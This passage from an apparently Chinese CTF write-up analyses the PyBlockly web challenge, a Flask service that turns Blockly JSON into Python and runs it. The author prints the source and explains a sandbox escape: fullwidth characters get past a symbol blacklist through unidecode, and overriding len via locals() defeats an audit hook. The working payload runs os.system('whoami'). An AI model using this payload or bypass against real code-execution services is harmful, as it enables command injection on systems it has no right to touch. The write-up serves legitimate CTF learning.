&quot;&quot;</span><br><span class="line">    python_code += block_to_python(block) + &quot;\n&quot; </span><br><span class="line">        </span><br><span class="line">    return python_code</span><br><span class="line"></span><br><span class="line">def do(source_code):</span><br><span class="line">    hook_code = &#x27;&#x27;&#x27;</span><br><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    print(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = compile(source_code, &quot;run.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    try:</span><br><span class="line">        if verify_secure(tree):</span><br><span class="line">            with open(&quot;run.py&quot;, &#x27;w&#x27;) as f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([&#x27;python&#x27;, &#x27;run.py&#x27;], stdout=subprocess.PIPE, timeout=5).stdout.decode(&quot;utf-8&quot;)</span><br><span class="line">            os.remove(&#x27;run.py&#x27;)</span><br><span class="line">            return result</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Execution aborted due to security concerns.&quot;</span><br><span class="line">    except:</span><br><span class="line">        os.remove(&#x27;run.py&#x27;)</span><br><span class="line">        return &quot;Timeout!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return app.send_static_file(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/blockly_json&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def blockly_json():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    print(blockly_data)</span><br><span class="line">    print(type(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(&#x27;utf-8&#x27;))</span><br><span class="line">    print(blockly_data)</span><br><span class="line">    try:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        return do(python_code)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Error generating Python code&quot;, &quot;details&quot;: str(e)&#125;)</span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host = &#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<p>index.html  &#x2F;&#x2F;网站根目录 JS 服务，会给 <code>/blockly_json</code> 发送 POST 请求及数据</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;PyBlockly&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://unpkg.com/blockly/blockly.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;PyBlockly&lt;/h1&gt;</span><br><span class="line">    &lt;div id=&quot;blocklyDiv&quot; style=&quot;height: 480px; width: 600px;&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;button id=&quot;saveButton&quot;&gt;Send&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;xml id=&quot;toolbox&quot; style=&quot;display: none&quot;&gt;</span><br><span class="line">      &lt;block type=&quot;text&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;math_number&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;math_arithmetic&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;print&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;max&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;min&quot;&gt;&lt;/block&gt;</span><br><span class="line">    &lt;/xml&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      // Define custom &#x27;print&#x27; block</span><br><span class="line">      Blockly.defineBlocksWithJsonArray([&#123;</span><br><span class="line">        &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">        &quot;message0&quot;: &quot;print %1&quot;,</span><br><span class="line">        &quot;args0&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;TEXT&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;previousStatement&quot;: null,</span><br><span class="line">        &quot;nextStatement&quot;: null,</span><br><span class="line">        &quot;colour&quot;: 160,</span><br><span class="line">        &quot;tooltip&quot;: &quot;Prints a value&quot;,</span><br><span class="line">        &quot;helpUrl&quot;: &quot;&quot;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line">      // Define custom &#x27;max&#x27; block</span><br><span class="line">      Blockly.defineBlocksWithJsonArray([&#123;</span><br><span class="line">        &quot;type&quot;: &quot;max&quot;,</span><br><span class="line">        &quot;message0&quot;: &quot;max of %1 and %2&quot;,</span><br><span class="line">        &quot;args0&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;A&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;B&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;output&quot;: &quot;Number&quot;,</span><br><span class="line">        &quot;colour&quot;: 230,</span><br><span class="line">        &quot;tooltip&quot;: &quot;Returns the maximum of two numbers&quot;,</span><br><span class="line">        &quot;helpUrl&quot;: &quot;&quot;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line">      // Define custom &#x27;min&#x27; block</span><br><span class="line">      Blockly.defineBlocksWithJsonArray([&#123;</span><br><span class="line">        &quot;type&quot;: &quot;min&quot;,</span><br><span class="line">        &quot;message0&quot;: &quot;min of %1 and %2&quot;,</span><br><span class="line">        &quot;args0&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;A&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;B&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;output&quot;: &quot;Number&quot;,</span><br><span class="line">        &quot;colour&quot;: 230,</span><br><span class="line">        &quot;tooltip&quot;: &quot;Returns the minimum of two numbers&quot;,</span><br><span class="line">        &quot;helpUrl&quot;: &quot;&quot;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      // Initialize Blockly</span><br><span class="line">      var workspace = Blockly.inject(&#x27;blocklyDiv&#x27;, &#123;</span><br><span class="line">        toolbox: document.getElementById(&#x27;toolbox&#x27;),</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      // Handle the button click event</span><br><span class="line">      $(&#x27;#saveButton&#x27;).click(function() &#123;</span><br><span class="line">        // Convert the Blockly workspace to JSON</span><br><span class="line">        var json = Blockly.serialization.workspaces.save(workspace);</span><br><span class="line"></span><br><span class="line">        // Send the JSON to the Flask backend</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">          type: &#x27;POST&#x27;,</span><br><span class="line">          url: &#x27;/blockly_json&#x27;,</span><br><span class="line">          data: JSON.stringify(json),</span><br><span class="line">          contentType: &#x27;application/json&#x27;,</span><br><span class="line">          success: function(response) &#123;</span><br><span class="line">            alert(&#x27;JSON sent to backend and received response: &#x27; + response);</span><br><span class="line">          &#125;,</span><br><span class="line">          error: function(error) &#123;</span><br><span class="line">            alert(&#x27;Error sending JSON to backend.&#x27;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>源码 + 自写注释，注释逻辑：从程序入口点开始看，跳转到其他自定义函数就往自定义函数写，最终写到程序执行结束</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import re</span><br><span class="line">import unidecode</span><br><span class="line">import string</span><br><span class="line">import ast</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import importlib.util</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;JSON_AS_ASCII&#x27;] = False</span><br><span class="line"></span><br><span class="line">blacklist_pattern = r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><span class="line"></span><br><span class="line">def module_exists(module_name):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    if spec is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    if module_name in sys.builtin_module_names:</span><br><span class="line">        return True</span><br><span class="line">    </span><br><span class="line">    if spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def verify_secure(m):</span><br><span class="line">    for node in ast.walk(m):  # 遍历抽象语法树（AST）中的所有节点</span><br><span class="line">        match type(node):   # 返回每个节点的类型, 并用match 匹配</span><br><span class="line">            case ast.Import:  # 如果匹配到是 ast.Import 节点类型, 则返回 false</span><br><span class="line">                print(&quot;ERROR: Banned module &quot;) </span><br><span class="line">                return False</span><br><span class="line">            case ast.ImportFrom:  # 如果匹配到是 ast.ImportFrom 节点类型, 则返回 false</span><br><span class="line">                print(f&quot;ERROR: Banned module &#123;node.module&#125;&quot;)</span><br><span class="line">                return False</span><br><span class="line">    return True  # 如果都没匹配到, 则返回 true</span><br><span class="line"></span><br><span class="line">def check_for_blacklisted_symbols(input_text): # 搭配 block_to_python 自定义函数取处理 json 数据</span><br><span class="line">    if re.search(blacklist_pattern, input_text):  # 将字符与黑名单字符进行匹配，成功则返回true</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def block_to_python(block):  # 该自定义函数的功能总体为处理请求体取出的 json 数据</span><br><span class="line">    block_type = block[&#x27;type&#x27;]  # 取出 &#x27;type&#x27; 的值</span><br><span class="line">    code = &#x27;&#x27;</span><br><span class="line">    </span><br><span class="line">    if block_type == &#x27;print&#x27;:  </span><br><span class="line">        text_block = block[&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]  # 如果取出的 &#x27;type&#x27; 的值为 &#x27;print&#x27;, 则继续取内部的 [&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]的键值</span><br><span class="line">        text = block_to_python(text_block)  # 将取出的键值(还是 json 数据)继续给当前自定义函数, 直到得到最终的匹配值返回</span><br><span class="line">        code = f&quot;print(&#123;text&#125;)&quot;  # 然后将最后匹配好的字符取出给 code</span><br><span class="line">           </span><br><span class="line">    elif block_type == &#x27;math_number&#x27;: </span><br><span class="line">                                                # 如果block_type是 &#x27;math_number&#x27;, 继续</span><br><span class="line">        if str(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]).isdigit():  </span><br><span class="line">            code =  int(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]) # 如果[&#x27;fields&#x27;][&#x27;NUM&#x27;]取出的字符转为字符串后是纯字符串型，则转为int类型并赋值给code</span><br><span class="line">        else:</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">    elif block_type == &#x27;text&#x27;:  </span><br><span class="line">        if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]): #如果block_type是 &#x27;text&#x27;，则在调用check_for_blacklisted_symbols，继续跟进</span><br><span class="line">            code = &#x27;&#x27;  # 返回true, 则code为空</span><br><span class="line">        else:</span><br><span class="line">        </span><br><span class="line">            code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;  # 返回flase，则将字符进行unidecode解码(用于处理特殊字符，这里存在特殊字符全角转换绕过)并拼接给code</span><br><span class="line">    elif block_type == &#x27;max&#x27;:</span><br><span class="line">        </span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)    #如果类型是max，则取出 [&#x27;inputs&#x27;][&#x27;A&#x27;/&#x27;B&#x27;][&#x27;block&#x27;]的值丢给当前自定义函数继续执行, 直到得到最终的匹配值返回</span><br><span class="line">        b = block_to_python(b_block)    </span><br><span class="line">        code =  f&quot;max(&#123;a&#125;, &#123;b&#125;)&quot;    # 然后将最后匹配好的字符取出给 code</span><br><span class="line"></span><br><span class="line">    elif block_type == &#x27;min&#x27;:</span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)   # #如果类型是max，则取出 [&#x27;inputs&#x27;][&#x27;A&#x27;/&#x27;B&#x27;][&#x27;block&#x27;]的值丢给当前自定义函数继续执行, 直到得到最终的匹配值返回</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;min(&#123;a&#125;, &#123;b&#125;)&quot;   # 然后将最后匹配好的字符取出给 code</span><br><span class="line"></span><br><span class="line">    if &#x27;next&#x27; in block:</span><br><span class="line">        </span><br><span class="line">        block = block[&#x27;next&#x27;][&#x27;block&#x27;]</span><br><span class="line">        </span><br><span class="line">        code +=&quot;\n&quot; + block_to_python(block)+ &quot;\n&quot;</span><br><span class="line">    else:</span><br><span class="line">        return code </span><br><span class="line">    return code  # 最终将参数code返回</span><br><span class="line"></span><br><span class="line">def json_to_python(blockly_data):</span><br><span class="line">    block = blockly_data[&#x27;blocks&#x27;][&#x27;blocks&#x27;][0]  # 取出 json 数据的 [&#x27;blocks&#x27;][&#x27;blocks&#x27;][0], 就是走过两个 blocks 元素后取出内部的键值(一个内嵌的json数据)</span><br><span class="line"></span><br><span class="line">    python_code = &quot;&quot; </span><br><span class="line">    python_code += block_to_python(block) + &quot;\n&quot;  # 将取出的数据丢给自定义函数 block_to_python, 继续跟进到block_to_python内部</span><br><span class="line">        </span><br><span class="line">    return python_code</span><br><span class="line"></span><br><span class="line">def do(source_code):</span><br><span class="line">    hook_code = &#x27;&#x27;&#x27;  </span><br><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    print(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = compile(source_code, &quot;run.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)  # flags=ast.PyCF_ONLY_AST, 这指定了将字符串编译为抽象语法树, 而不是编译成可执行的字节码</span><br><span class="line">    try:</span><br><span class="line">        if verify_secure(tree):  # 继续跟进到 verify_secure() 自定义函数, 返回 true 则往下执行</span><br><span class="line">            with open(&quot;run.py&quot;, &#x27;w&#x27;) as f: </span><br><span class="line">                f.write(code)  # 将 code(hook_code 和 传入的值拼接的字符串) 写入 run.py 文件中</span><br><span class="line">            result = subprocess.run([&#x27;python&#x27;, &#x27;run.py&#x27;], stdout=subprocess.PIPE, timeout=5).stdout.decode(&quot;utf-8&quot;)  # 用 python 运行 run.py 并捕获执行结果传入给 result</span><br><span class="line">            os.remove(&#x27;run.py&#x27;)</span><br><span class="line">            return result # 返回执行结果</span><br><span class="line">        else:  # 返回 false 则返回报错字符串</span><br><span class="line">            return &quot;Execution aborted due to security concerns.&quot;</span><br><span class="line">    except:</span><br><span class="line">        os.remove(&#x27;run.py&#x27;)</span><br><span class="line">        return &quot;Timeout!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return app.send_static_file(&#x27;index.html&#x27;)   # 访问网站根目录，返回 index.html 静态文件给客户端</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/blockly_json&#x27;, methods=[&#x27;POST&#x27;])  # 当请求 /blockly_json 且请求方式为 POST 时执行下面代码</span><br><span class="line">def blockly_json():</span><br><span class="line">    blockly_data = request.get_data()  # 返回 data 请求体, 这里是 json 数据</span><br><span class="line">    print(type(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(&#x27;utf-8&#x27;)) # 将 JSON 格式的字符串解析为 Python 对象, 这样才能对字符串进行python操作</span><br><span class="line">    print(blockly_data)</span><br><span class="line">    try:</span><br><span class="line">        python_code = json_to_python(blockly_data)  # 调用 json_to_python 自定义函数，这里跟进到 json_to_python 自定义函数中去</span><br><span class="line">        return do(python_code) # 跟进到 do 自定义函数</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Error generating Python code&quot;, &quot;details&quot;: str(e)&#125;)  # 将报错及字典内容转换为 json 响应格式, 并将内容返回给客户端</span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host = &#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<p>程序会先将输入的数据进行处理，并与 <code>hook_code</code> 进行拼接，然后将拼接后的内容写入 <code>run.py</code> 并执行，返回执行结果</p>
+<p>hook_code，关键代码块如下，当输入 xxx 时，程序会将输入的字符拼接在下面并执行代码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></div>
+
+<p>解题思路，写入 <code>__import__(os).system(whoami)</code> ，命令注入，但会被 <code>if len(event_name) &gt; 4: raise RuntimeError(&quot;Too Long!&quot;)</code>  拦截</p>
+<p>绕过思路：</p>
+<p><code>locals()</code> 包含常见的函数，使用 <code>update()</code> 覆盖 <code>len()</code> 函数，当用 <code>len()</code> 函数时去执行匿名函数 <code>lambda x:4</code>，让其只返回 4</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locals().update(&#123;&quot;len&quot;:lambda x:4&#125;);__import__(&quot;os&quot;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p>程序设置了黑名单，将 <code>$!</code> 等有特殊作用的字符全部过滤了，但是下面的代码存在编码转换绕过</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;</span><br><span class="line"># 将字符进行unidecode解码(用于处理特殊字符，这里存在特殊字符全角转换绕过)并拼接给code</span><br></pre></td></tr></table></figure></div>
+
+<p>半角全角编码转换 py 脚本</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def to_fullwidth(text):</span><br><span class="line">    return &#x27;&#x27;.join([chr(ord(char) + 0xFEE0) if &#x27;!&#x27; &lt;= char &lt;= &#x27;~&#x27; else char for char in text])</span><br><span class="line"></span><br><span class="line">def to_halfwidth(text):</span><br><span class="line">    return &#x27;&#x27;.join([chr(ord(char) - 0xFEE0) if &#x27;！&#x27; &lt;= char &lt;= &#x27;～&#x27; else char for char in text])</span><br><span class="line"></span><br><span class="line"># 示例用法</span><br><span class="line">text = &quot;!!!&quot;</span><br><span class="line">print(&quot;全角:&quot;, to_fullwidth(text))  # 转换为全角</span><br><span class="line">print(&quot;半角:&quot;, to_halfwidth(to_fullwidth(text)))  # 转换为半角</span><br></pre></td></tr></table></figure></div>
+
+<p>假如输入一个中文，会转为<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107163216101.png" class title="image-20241107163216101"></p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107170231102.png" class title="image-20241107170231102">
+
+<p>输入全角的 <code>!!!</code>，可以看到对方会解析成正常的 <code>!!!</code></p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107170243066.png" class title="image-20241107170243066">
+
